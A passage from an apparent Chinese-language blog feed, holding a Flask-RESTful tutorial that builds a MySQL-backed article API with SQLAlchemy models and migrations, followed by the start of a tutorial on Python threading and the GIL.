punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>marshal<span class="token punctuation">(</span>data<span class="token punctuation">,</span>resource_fields<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">'{"name": null, "detail": [{"price": 12, "description": "This is a Python book."}]}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="7-实际使用"><a href="#7-实际使用" class="headerlink" title="7.实际使用"></a>7.实际使用</h3><blockquote><p>通过定义一个<code>API</code> ,集合数据库,返回给前端数据库中的数据.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">.</span>├── app.py├── config.py├── exts.py├── manage.py├── migrations│   ├── alembic.ini│   ├── env.py│   ├── README│   ├── script.py.mako│   └── versions│       ├── 07d0ca1a599d_.py├── static└── templates<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>config.py</code></p><pre class="line-numbers language-python"><code class="language-python">DEBUG<span class="token operator">=</span><span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD<span class="token operator">=</span><span class="token boolean">True</span>DB_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/flask_restful_demo'</span> <span class="token comment" spellcheck="true"># 确保数据库存在</span><span class="token comment" spellcheck="true"># 指定数据库连接</span>SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> DB_URISQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>exts.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemydb <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>sql_models.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">class</span> <span class="token class-name">Users</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'users'</span> id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span>primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> name <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> email <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> password <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 创建双向引用</span> articles <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'Articles'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>article_tag <span class="token operator">=</span> db<span class="token punctuation">.</span>Table<span class="token punctuation">(</span><span class="token string">'article_tag'</span><span class="token punctuation">,</span>                    db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span><span class="token string">'a_id'</span><span class="token punctuation">,</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span>db<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span><span class="token string">'articles.id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span><span class="token string">'t_id'</span><span class="token punctuation">,</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span>db<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span><span class="token string">'tags.id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>                    <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Articles</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'articles'</span> id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> name <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> contents <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Text<span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 与表users是多对一的关系</span> u_id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span>db<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span><span class="token string">'users.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 创建双向引用</span> users<span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'Users'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'articles'</span><span class="token punctuation">)</span> tags <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'Tags'</span><span class="token punctuation">,</span>secondary<span class="token operator">=</span>article_tag <span class="token punctuation">,</span>back_populates<span class="token operator">=</span><span class="token string">'articles'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Tags</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'tags'</span> id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> name <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 创建双向引用</span> articles <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'Articles'</span><span class="token punctuation">,</span>secondary<span class="token operator">=</span>article_tag<span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'tags'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化数据库,并且生成迁移脚本</p><pre class="line-numbers language-mysql">mysql&gt;  create database flask_restful_demo;</code></pre><p>初始化,并生成迁移脚本.</p><pre><code class="python"><code class="language-mysql">mysql&gt;  create database flask_restful_demo;</code></pre><p>初始化,并生成迁移脚本.</p><pre><code class="python">from flask_script import Managerfrom app import appfrom flask_migrate import Migrate,MigrateCommandfrom exts import db# 导入ORMimport sql_models# 绑定appmanage = Manager(app)# 导入 flask-migrate# 导入的Migrate类 可以绑定app ,db到 migrate 中# 导入的MigrateCommand 类可以使用 Alembic 中所有的命令Migrate(app,db)manage.add_command('db', MigrateCommand)if __name__ == '__main__': manage.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">  > python manage.py db init  > python manage.py db migrate  > python manage.py db upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> views<span class="token keyword">import</span> config<span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> Api<span class="token punctuation">,</span> Resource<span class="token punctuation">,</span> marshal_with<span class="token punctuation">,</span> fields<span class="token keyword">from</span> sql_models <span class="token keyword">import</span> Users<span class="token punctuation">,</span> Articles<span class="token punctuation">,</span> Tagsapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># db绑定app</span>db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Api绑定app</span>api <span class="token operator">=</span> Api<span class="token punctuation">(</span>app<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'这是主页'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''注册数据'''</span>    user <span class="token operator">=</span> Users<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">,</span> email<span class="token operator">=</span><span class="token string">'Jack@kning.com'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">)</span>    article <span class="token operator">=</span> Articles<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'python'</span><span class="token punctuation">,</span> contents<span class="token operator">=</span><span class="token string">'First paper'</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    tag1 <span class="token operator">=</span> Tags<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"Python"</span><span class="token punctuation">)</span>    tag2 <span class="token operator">=</span> Tags<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'Computer'</span><span class="token punctuation">)</span>    article<span class="token punctuation">.</span>users <span class="token operator">=</span> user    article<span class="token punctuation">.</span>tags<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tag1<span class="token punctuation">)</span>    article<span class="token punctuation">.</span>tags<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tag2<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>article<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'注册成功'</span><span class="token comment" spellcheck="true"># 重载方法GET,并且格式化数据输出</span><span class="token keyword">class</span> <span class="token class-name">ArticleOutput</span><span class="token punctuation">(</span>Resource<span class="token punctuation">)</span><span class="token punctuation">:</span>    resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span>           <span class="token comment" spellcheck="true"># 隐藏原始数据的 字段</span>        <span class="token string">'article_name'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'article_contents'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'article_author'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>fields<span class="token punctuation">.</span>Nested<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">'author_name'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'author_email'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'email'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'article_tags'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>fields<span class="token punctuation">.</span>Nested<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">'tag1'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'name1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'tag2'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'name2'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># marshal_with 重载数据为 OrderDict.</span>    @marshal_with<span class="token punctuation">(</span>resource_fields<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> article_id<span class="token punctuation">)</span><span class="token punctuation">:</span>        article_id <span class="token operator">=</span> int<span class="token punctuation">(</span>article_id<span class="token punctuation">)</span>        article <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Articles<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Articles<span class="token punctuation">.</span>id<span class="token operator">==</span>article_id<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 原始数据</span>        detail <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'name'</span><span class="token punctuation">:</span> article<span class="token punctuation">.</span>name<span class="token punctuation">,</span>            <span class="token string">'contents'</span><span class="token punctuation">:</span> article<span class="token punctuation">.</span>contents<span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">#'article_name':'Python',</span>            <span class="token comment" spellcheck="true">#'article_contents':'first page',</span>            <span class="token string">'article_author'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token string">'name'</span><span class="token punctuation">:</span> article<span class="token punctuation">.</span>users<span class="token punctuation">.</span>name<span class="token punctuation">,</span>                <span class="token string">'email'</span><span class="token punctuation">:</span> article<span class="token punctuation">.</span>users<span class="token punctuation">.</span>email            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token string">'article_tags'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token string">'name1'</span><span class="token punctuation">:</span> article<span class="token punctuation">.</span>tags<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>                <span class="token string">'name2'</span><span class="token punctuation">:</span> article<span class="token punctuation">.</span>tags<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> detailapi<span class="token punctuation">.</span>add_resource<span class="token punctuation">(</span>ArticleOutput<span class="token punctuation">,</span> <span class="token string">'/api/article/&lt;int:article_id>'</span><span class="token punctuation">,</span> endpoint<span class="token operator">=</span><span class="token string">'article'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问网站</p><pre class="line-numbers language-shell"><code class="language-shell">❯ curl http://127.0.0.1:5000/api/article/1{    "article_name": "python",    "article_contents": "First paper",    "article_author": "{'name': 'Jack', 'email': 'Jack@kning.com'}",    "article_tags": "{'name1': 'Python', 'name2': 'Computer'}"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="8-蓝图中使用"><a href="#8-蓝图中使用" class="headerlink" title="8.蓝图中使用"></a>8.蓝图中使用</h3><blockquote><p>在蓝图中使用时,初始化的对象不是<code>app</code>,而是蓝图<code>bp</code></p><pre class="line-numbers language-python"><code class="language-python">article_bp <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token string">'article'</span><span class="token punctuation">,</span>__name__<span class="token punctuation">,</span>url_prefix<span class="token operator">=</span><span class="token string">'/article'</span><span class="token punctuation">)</span>api <span class="token operator">=</span> Api<span class="token punctuation">(</span>article_bp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="9-模板渲染"><a href="#9-模板渲染" class="headerlink" title="9.模板渲染"></a>9.模板渲染</h3><blockquote><p><code>flask_restful</code>是一个<code>API</code> 的实现,它返回的都是<code>json</code> 数据,如果要使用<code>html</code> ,需要先声明.</p><pre class="line-numbers language-python"><code class="language-python">@api<span class="token punctuation">.</span>representation<span class="token punctuation">(</span><span class="token string">'text/html'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">out_html</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> code<span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">:</span> resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token keyword">return</span> resp<span class="token keyword">class</span> <span class="token class-name">HelloView</span><span class="token punctuation">(</span>Resource<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">)</span>api<span class="token punctuation">.</span>add_resource<span class="token punctuation">(</span>HelloView<span class="token punctuation">,</span> <span class="token string">'/hello/'</span><span class="token punctuation">,</span> endpoint<span class="token operator">=</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:python支持多线程</title>
      <link href="/posts/37055.html"/>
      <url>/posts/37055.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png"></p><h2 id="Python对多线程的支持"><a href="#Python对多线程的支持" class="headerlink" title="Python对多线程的支持"></a>Python对多线程的支持</h2><blockquote><p>虚拟机层面:</p><ul><li>Python虚拟机使用GIL(Global Interpreter Lock,全局解释器锁)来互斥线程对共享资源的访问，暂时无法利用多处理器的优势.见<a href="./10064.md">GIL详解</a></li><li>Python在设计时是这样考虑的,在解释器中同时只能有一个控制线程在执行,就像单核CPU系统的多线程一样,内存中可以有许多程序,但是在<strong>任意的给定时刻</strong> 只能有一个程序在运行,</li><li>GIL锁保证了<strong>同一时间只能有一个线程</strong> 在运行,在多线程环境中,Python虚拟机按照下面的方式来运行<ul><li>1.设置GIL</li><li>2.切换进一个线程去运行</li><li>3.执行下面的操作之一<ul><li>a.指定数量的字节码指令</li><li>b.线程主动让出控制权(调用<code>time.sleep(0)</code>)来完成</li></ul></li><li>4.把线程设置回睡眠状态(切换出线程)</li><li>5.解锁GIL</li><li>6.重复上面的步骤</li></ul></li></ul><p>语言方面</p><ul><li>在语言层面，Python对多线程提供了很好的支持，Python中多线程相关的模块包括：<code>thread，threading，Queue</code>.可以方便地支持创建线程、互斥锁、信号量、同步等特性.</li></ul></blockquote><h3 id="1-thread"><a href="#1-thread" class="headerlink" title="1.thread"></a>1.<code>thread</code></h3><blockquote><p><code>thread</code> 是多线程的底层支持模块,一般不建议使用</p></blockquote><h3 id="2-threading"><a href="#2-threading" class="headerlink" title="2.threading"></a>2.<code>threading</code></h3><blockquote><p>对<code>thread</code> 进行了封装,有了高级功能,对一些线程的操作对象化,提供下列类:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> pdir<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> threading<span class="token operator">>></span><span class="token operator">></span> pdir<span class="token punctuation">(</span>threading<span class="token punctuation">)</span><span class="token keyword">class</span><span class="token punctuation">:</span>Barrier<span class="token punctuation">:</span> Implements a Barrier<span class="token punctuation">.</span>BoundedSemaphore<span class="token punctuation">:</span> Implements a bounded semaphore<span class="token punctuation">.</span>Condition<span class="token punctuation">:</span> Class <span class="token class-name">that</span> implements a condition variable<span class="token punctuation">.</span>Event<span class="token punctuation">:</span> Class <span class="token class-name">implementing</span> event objects<span class="token punctuation">.</span>Semaphore<span class="token punctuation">:</span> This <span class="token keyword">class</span> <span class="token class-name">implements</span> semaphore objects<span class="token punctuation">.</span>Thread<span class="token punctuation">:</span> A <span class="token keyword">class</span> <span class="token class-name">that</span> represents a thread of control<span class="token punctuation">.</span>Timer<span class="token punctuation">:</span> Call a function after a specified number of seconds<span class="token punctuation">:</span>function<span class="token punctuation">:</span>Lock<span class="token punctuation">:</span> allocate_lock<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> lock objectRLock<span class="token punctuation">:</span> Factory function that returns a new reentrant lock<span class="token punctuation">.</span>activeCount<span class="token punctuation">:</span> Return the number of Thread objects currently alive<span class="token punctuation">.</span>active_count<span class="token punctuation">:</span> Return the number of Thread objects currently alive<span class="token punctuation">.</span>currentThread<span class="token punctuation">:</span> Return the current Thread object<span class="token punctuation">,</span> corresponding to the caller's thread of control<span class="token punctuation">.</span>current_thread<span class="token punctuation">:</span> Return the current Thread object<span class="token punctuation">,</span> corresponding to the caller's thread of control<span class="token punctuation">.</span>enumerate<span class="token punctuation">:</span> Return a list of all Thread objects currently alive<span class="token punctuation">.</span>get_ident<span class="token punctuation">:</span> get_ident<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> integermain_thread<span class="token punctuation">:</span> Return the main thread object<span class="token punctuation">.</span>setprofile<span class="token punctuation">:</span> Set a profile function <span class="token keyword">for</span> all threads started <span class="token keyword">from</span> the threading module<span class="token punctuation">.</span>settrace<span class="token punctuation">:</span> Set a trace function <span class="token keyword">for</span> all threads started <span class="token keyword">from</span> the threading module<span class="token punctuation">.</span>stack_size<span class="token punctuation">:</span> stack_size<span class="token punctuation">(</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> sizeexception<span class="token punctuation">:</span>BrokenBarrierError<span class="token punctuation">:</span> Unspecified run<span class="token operator">-</span>time error<span class="token punctuation">.</span>ThreadError<span class="token punctuation">:</span> Unspecified run<span class="token operator">-</span>time error<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>类包含以下几种</p><hr><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td><code>theading.Thread</code></td><td>最主要的线程类</td></tr><tr><td><code>threading.Timer</code></td><td>与Thread类似,但要等待一段时间后才开始运行,是Thread的子类</td></tr><tr><td><code>threading.Condition</code></td><td>条件变量,能让一个线程停下来,等待其他线程满足某个条件</td></tr><tr><td><code>threading.Event</code></td><td>事件对象,是线程间最简单的通信机制之一,线程可以激活在一个事件对象上等待的其他线程</td></tr><tr><td><code>threading.Semaphore</code></td><td>信号量对象,是个变量,管理一个内置的计数器,指定可同时访问资源或者进入临界区的线程数</td></tr><tr><td><code>threading.BoundedSemaphore</code></td><td>有界信号量对象,与semaphore类似,但不允许超过初始值</td></tr><tr><td><code>threading.ThreadError</code></td><td>线程错误信息类</td></tr></tbody></table><hr><p>方法包括</p><table><thead><tr><th><code>threading.Lock</code></th><th>原锁,是一个同步原语,当它锁住时不归某个特定的线程所有,这个可以对全局变量互斥时使用</th></tr></thead><tbody><tr><td><code>threading.RLock</code></td><td>可重入锁,使单线程可以再次获得已经获得的锁,即可以被相同的线程获得多次</td></tr><tr><td><code>active_count()/activeCount()</code></td><td>返回当前活着的Thread对象个数</td></tr><tr><td>current_thread()/<br>currentThread()</td><td>返回当前的Thread对象,对应于调用者控制的线程.如果调用者控制的线程不是通过threading模块创建的,则返回一个只有有限功能的虚假线程对象</td></tr><tr><td><code>enumerate()</code></td><td>返回当前活着的Thread对象的列表.该列表包括守护线程,由current_thread()创建的虚假线程对象和主线程,它不包括终止的线程和还没有开始的线程</td></tr><tr><td><code>settrace(func)</code></td><td>为所有从threading模块启动的线程设置一个跟踪函数,在每个线程的run()方法调用之前func将传递给sys.settrace()(该函数是设置系统的跟踪函数)</td></tr><tr><td>stack_size([size])</td><td>返回创建新的线程时该线程使用的栈的大小. 可选的size参数指定后来创建的线程使用栈的大小,它必须是0(使用平台的或者配置的默认值)或不少于32,768(32kB)的正整数</td></tr></tbody></table><p><code>threading.Thread</code></p><p>这是最主要的线程类,可以用来创建线程实例,包含的方法有:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> pdir<span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span>descriptor<span class="token punctuation">:</span> daemon<span class="token punctuation">:</span> @property <span class="token keyword">with</span> getter<span class="token punctuation">,</span> setter<span class="token punctuation">,</span> A boolean value indicating whether this thread <span class="token keyword">is</span> a daemon thread<span class="token punctuation">.</span> ident<span class="token 